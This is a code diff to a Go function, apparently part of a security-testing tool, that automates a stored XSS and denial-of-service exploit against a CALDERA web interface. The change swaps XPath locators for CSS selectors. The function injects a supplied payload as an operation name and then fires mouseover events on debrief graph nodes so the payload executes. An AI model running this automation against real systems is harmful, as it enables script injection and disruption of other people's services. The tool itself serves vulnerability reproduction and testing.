@@ -166,15 +166,15 @@ func storedXSSDosVuln(payload string) error {
 		return err
 	}
 
-	// XPath and selectors for chromeDP
-	opLinkXPath := "/html/body/main/div[1]/aside/ul[1]/li[4]/a"
-	createOPXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/form/div/div[2]/button"
+	// Selectors for chromeDP
+	opLinkSelector := `a.nav-item[x-on\:click*="operations"]`
+	createOPSelector := `button[x-on\:click="openOperationCreateModal()"]`
 	opNameSelector := "#op-name"
-	startButtonXPath := "/html/body/main/div[2]/div[2]/div[1]/div/div/div[3]/div[2]/footer/nav/div[2]/div/button"
-	debriefLinkXPath := "/html/body/main/div[1]/aside/ul[2]/li[4]/a"
-	firstOperationXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[1]/form/div/div/div/select/option[1]"
-	opGraphDropdownSelectXPath := "/html/body/main/div[2]/div[2]/div[2]/div/div[2]/div[2]/div[2]/div[3]/div[2]/div/select"
-	tacticSelector := "#debrief-graph > div.is-flex.graph-controls.m-2 > div > select"
+	startButtonSelector := `button[x-on\:click="addOperation()"]`
+	debriefLinkSelector := `a.nav-item[x-on\:click*="debrief"]`
+	firstOperationSelector := `select[x-model="selectedOperationID"] option:first-of-type`
+	opGraphDropdownSelector := `#debrief-graph select`
+	tacticSelector := `#debrief-graph select`
 	triggerVulnJS := "nodes = document.querySelectorAll('[id^=node]'); nodes.forEach((x, i) => x.dispatchEvent(new MouseEvent('mouseover', {'bubbles': true})));"
 
 	imagePath := viper.GetString("image_path")
@@ -206,23 +206,23 @@ func storedXSSDosVuln(payload string) error {
 	if err := chromedp.Run(caldera.Driver.Context,
 		network.Enable(),
 		// Click the operations link
-		chromedp.Click(opLinkXPath),
+		chromedp.Click(opLinkSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Click Create Operation button
-		chromedp.Click(createOPXPath),
+		chromedp.Click(createOPSelector),
 		// Create operation with the provided payload
 		chromedp.SendKeys(opNameSelector, payload),
 		// Click the Start button
-		chromedp.Click(startButtonXPath),
+		chromedp.Click(startButtonSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Click the debrief link
-		chromedp.Click(debriefLinkXPath),
+		chromedp.Click(debriefLinkSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Click the operation with the payload that we introduced previously
-		chromedp.Click(firstOperationXPath),
+		chromedp.Click(firstOperationSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Click the debrief graph dropdown menu
-		chromedp.Click(opGraphDropdownSelectXPath),
+		chromedp.Click(opGraphDropdownSelector),
 		chromedp.Sleep(Wait(2000)),
 		// Select Tactic from the operation graph dropdown menu
 		chromedp.SendKeys(tacticSelector, "Tactic"),
